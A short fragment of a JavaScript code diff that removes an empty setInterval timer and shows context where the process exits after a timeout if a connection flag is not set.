     }
-
-    setInterval(() => {
-    }, 1100);
 
     if (!connectFlag) {
         setTimeout(() => process.exit(1), time * 1000);
